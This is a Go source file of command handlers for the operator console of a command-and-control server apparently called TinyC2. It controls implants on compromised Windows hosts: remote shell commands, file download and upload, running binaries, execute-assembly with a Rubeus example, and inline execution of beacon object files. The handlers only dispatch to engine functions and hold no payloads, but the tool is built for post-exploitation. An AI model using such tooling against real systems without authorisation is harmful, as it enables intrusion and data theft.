package handlers

import (
	"strconv"
	"strings"

	"github.com/0xPrimo/TinyC2/server/internal/core"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"
)

func HandleImplant(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("implant [interact|kill|list]")
		return
	}

	subcmd := args[0]
	switch subcmd {
	case "interact":
		HandleImplantInteract(engine, session, args[1:])
	case "kill":
		if len(args) < 2 {
			logger.Info("implant kill [id]")
			return
		}
		id, err := strconv.ParseUint(args[1], 16, 32)
		if err != nil {
			logger.Error("failed to parse id: %v", err)
			return
		}
		engine.ImplantKill(uint32(id))

	case "list":
		engine.ImplantList()
	case "back":
		*session = 0
	}
}

func HandleImplantInteract(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("implant interact [id]")
		return
	}

	id, err := strconv.ParseUint(args[0], 16, 32)
	if err != nil {
		logger.Error("failed to parse id: %v", err)
		return
	}

	_, exists := engine.Implants[uint32(id)]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return
	}

	*session = uint32(id)
}

func HandleImplantChannel(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("channel [register|switch|list|remove]")
		return
	}

	subcmd := args[0]
	switch subcmd {
	case "register":
		if len(args) < 2 {
			logger.Info("channel register [name]")
			return
		}
		engine.ImplantChannelRegister(*session, args[1])
	case "switch":
		if len(args) < 2 {
			logger.Info("channel switch [name]")
			return
		}
		engine.ImplantChannelSwitch(*session, args[1])
	case "remove":
		if len(args) < 2 {
			logger.Info("channel switch [name]")
			return
		}
		engine.ImplantChannelRemove(*session, args[1])
	case "list":
		engine.ImplantChannelList(*session)
	}
}

func HandleImplantJob(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("channel [list|stop]")
		return
	}

	subcmd := args[0]
	switch subcmd {
	case "stop":
		if len(args) < 2 {
			logger.Info("channel switch [name]")
			return
		}

		id, err := strconv.ParseUint(args[1], 16, 32)
		if err != nil {
			logger.Error("failed to parse id: %v", err)
			return
		}

		engine.ImplantJobStop(*session, uint32(id))
	case "list":
		engine.ImplantJobList(*session)
	}
}

func HandleImplantPs(engine *core.Engine, session *uint32, args []string) {
	engine.ImplantPs(*session)
}

func HandleImplantCd(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("cd [path\\to\\directory]")
		return
	}

	engine.ImplantCd(*session, args[0])
}

func HandleImplantCp(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 2 {
		logger.Info("cp [path\\to\\src] [path\\to\\dest]")
		return
	}

	engine.ImplantCp(*session, args[0], args[1])
}

func HandleImplantShell(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("shell \"whoami /all\"")
		return
	}

	command := args[0]
	for _, arg := range args[1:] {
		command += " " + arg
	}

	engine.ImplantShell(*session, command)
}

func HandleImplantDownload(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("download [path\\to\\file]")
		return
	}

	engine.ImplantDownload(*session, args[0])
}

func HandleImplantUpload(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("upload [path\\to\\file]")
		return
	}

	engine.ImplantUpload(*session, args[0], args[1])
}

func HandleImplantRun(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("run [bin.exe] [args|optional]")
		return
	}

	engine.ImplantRun(*session, strings.Join(args, " "))
}

func HandleImplantExecuteAssembly(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 1 {
		logger.Info("execute-assembly [/path/to/rubeus.exe] [klist]")
		return
	}

	dotnet := args[0]
	cmdargs := strings.Join(args[1:], " ")
	engine.ImplantExecuteAssembly(*session, dotnet, cmdargs)
}

func HandleImplantInlineExecute(engine *core.Engine, session *uint32, args []string) {
	if len(args) < 3 {
		logger.Info(
			`
[*] Usage:
       inline-execute [/path/to/bof.o] [pack order] [args]\n

[*] Example:
       inline-execute ./dir.x64.o zs C:\ 0        
`)
		return
	}

	bof := args[0]
	pack := args[1]
	bofargs := args[2:]
	engine.ImplantInlineExecute(*session, bof, pack, bofargs)
}